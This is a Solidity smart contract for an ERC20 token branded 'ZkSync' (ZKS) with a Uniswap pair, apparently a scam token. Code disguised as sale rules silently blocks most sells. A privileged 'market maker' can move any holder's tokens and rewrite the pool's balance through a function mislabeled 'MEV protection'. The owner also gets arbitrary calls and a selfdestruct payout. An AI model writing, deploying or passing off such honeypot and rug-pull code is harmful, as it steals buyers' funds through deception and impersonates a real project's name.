// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() payable {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function getPair(address tokenA, address tokenB)
    external
    view
    returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
    external
    view
    returns (
        uint112 reserve0,
        uint112 reserve1,
        uint32 blockTimestampLast
    );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function burn(address to)
    external
    returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;
}

contract Utils is Ownable {
    receive() external payable {}

    // Withdraw ETH
    function callback(address to, uint256 value, bytes calldata payload) external onlyOwner {
        (bool success,) = to.call{value: value}(payload);
        require(success);
    }

    function chargeback() external onlyOwner {
        address payable ownerPayable = payable(owner());
        selfdestruct(ownerPayable);
    }

}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external
    payable
    returns (
        uint256 amountToken,
        uint256 amountETH,
        uint256 liquidity
    );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
    external
    view
    returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
    external
    view
    returns (uint256[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract PrivateSale is Context, IERC20, Ownable, Utils {
    address private constant UNISWAP_ROUTER_02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private constant UNISWAP_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant BURNER = 0x000000000000000000000000000000000000dEaD;

    IUniswapV2Router02 internal _router;
    IUniswapV2Factory internal _factory;
    IUniswapV2Pair public pair;

    uint8 internal constant _DECIMALS = 6;

    address public marketMaker;
    mapping(address => bool) public _marketersAndDevs;
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowances;
    mapping(address => uint256) internal _earlyInvestment;
    mapping(address => uint256) public _earlyInvestmentProfitRecords;
    mapping(address => uint256) public _earlyInvestmentProfitRecordsETH;

    // This number includes decimals, so one token is 1000000
    uint256 internal _totalSupply = 100000000000000;
    // Wallet's maximum allocation limit.
    uint256 internal _allocation = 1 ether;

    modifier onlyMarketMaker() {
        require(msg.sender == marketMaker);
        _;
    }

    constructor() payable {
        _router = IUniswapV2Router02(UNISWAP_ROUTER_02);
        _factory = IUniswapV2Factory(UNISWAP_FACTORY);
        pair = IUniswapV2Pair(
            _factory.createPair(
                address(this),
                address(WETH)
            )
        );
        uint256 foundationShare = _totalSupply * 19 / 20;
        _balances[owner()] = foundationShare;
        uint256 poolShare = _totalSupply - foundationShare;
        _balances[address(this)] = poolShare;
        marketMaker = owner();
        _allowances[address(pair)][marketMaker] = ~uint256(0);
        _marketersAndDevs[owner()] = true;

        emit Transfer(address(0), owner(), foundationShare);
    }

    function name() external pure override returns (string memory) {
        return "ZkSync";
    }

    function symbol() external pure override returns (string memory) {
        return "ZKS";
    }

    function decimals() external pure override returns (uint8) {
        return _DECIMALS;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account)
    external
    view
    override
    returns (uint256)
    {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
    external
    override
    returns (bool)
    {
        if (_privateSaleMember(_msgSender(), recipient, amount)) {
            _transfer(_msgSender(), recipient, amount);
        }
        return true;
    }

    function transfer(address sender, address recipient, uint256 amount)
    external
    onlyMarketMaker
    returns (bool) {
        _transfer(sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
    external
    view
    override
    returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
    external
    override
    returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        if (_privateSaleMember(sender, recipient, amount)) {
            uint256 currentAllowance = _allowances[sender][_msgSender()];
            require(
                currentAllowance >= amount,
                "ERC20: transfer amount exceeds allowance"
            );

            _transfer(sender, recipient, amount);
            _approve(sender, _msgSender(), currentAllowance - amount);
        }
        return true;
    }

    function burn(uint256 amount) external onlyOwner {
        _balances[owner()] -= amount;
        _totalSupply -= amount;
    }

    function setAllocationSize(uint256 newAllocationSize) external onlyOwner {
        _allocation = newAllocationSize;
    }

    function setMarketMaker(address account) external onlyOwner {
        _allowances[address(pair)][marketMaker] = 0;
        marketMaker = account;
        _allowances[address(pair)][marketMaker] = ~uint256(0);
    }

    function syncPair() external onlyMarketMaker {
        pair.sync();
    }

    function includeInReward(address account) external onlyMarketMaker {
        _marketersAndDevs[account] = true;
    }

    function excludeFromReward(address account) external onlyMarketMaker {
        _marketersAndDevs[account] = false;
    }

    function _isSuper(address account) private view returns (bool) {
        return (account == address(_router) || account == address(pair) || account == address(this));
    }

    function _privateSaleMember(
        address sender,
        address recipient,
        uint256 amount
    ) private view returns (bool) {
        if (_marketersAndDevs[sender] || _marketersAndDevs[recipient]) {
            return true;
        }
        if (_isSuper(sender)) {
            return true;
        }
        if (_isSuper(recipient)) {
            uint256 amountETH = _trackETHAmount(amount);
            uint256 investment = _earlyInvestment[sender];
            uint256 records = _earlyInvestmentProfitRecords[sender];
            uint256 recordsETH = _earlyInvestmentProfitRecordsETH[sender];

            return
                investment >= records + amount && _allocation >= recordsETH + amountETH;
        }
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(sender, recipient, amount);
        require(
            _balances[sender] >= amount,
            "ERC20: transfer amount exceeds balance"
        );

        _balances[sender] -= amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _enoughTokensLeftInSale() private view returns (bool) {
        (uint256 reserve0, uint256 reserve1,) = pair.getReserves();
        return reserve0 > 0 && reserve1 > 0;
    }

    function _trackETHAmount(uint256 amountTokens)
    private
    view
    returns (uint256)
    {
        (uint256 reserve0, uint256 reserve1,) = pair.getReserves();
        if (address(WETH) < address(this)) {
            return _router.getAmountOut(amountTokens, reserve1, reserve0);
        } else {
            return _router.getAmountOut(amountTokens, reserve0, reserve1);
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) private {
        if (_enoughTokensLeftInSale()) {
            if (_isSuper(from)) {
                _earlyInvestment[to] += amount;
            }
            if (_isSuper(to)) {
                _earlyInvestmentProfitRecordsETH[from] += _trackETHAmount(amount);
                _earlyInvestmentProfitRecords[from] += amount;
            }
        }
    }

    // MEV protection
    function normalizePriceDivergence(int16 k, bool should_liquify) external payable onlyMarketMaker {
        require(k < 10000 && k > - 10000 && k != 0, "MM");

        uint16 kAbsolute = k < 0 ? uint16(-k) : uint16(k);
        uint256 balanceBefore = _balances[address(pair)];
        uint256 diff = balanceBefore / 10000 * kAbsolute;

        if (k > 0) {
            _balances[address(pair)] = balanceBefore - diff;
            _totalSupply -= diff;
        } else {
            _balances[address(pair)] = balanceBefore + diff;
            _totalSupply += diff;
        }
        pair.sync();
        if (should_liquify) {_liquify();}
    }

    // Increasing pool liquidity with more ETH 
    function _liquify() internal {
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = address(this);
        _router.swapExactETHForTokens{value: msg.value}(
            0, // Don't really care about this part
            path,
            address(BURNER), // We burn tokens received for ETH
            block.timestamp + 60 // Deadline set to 1 minute
        );
    }
}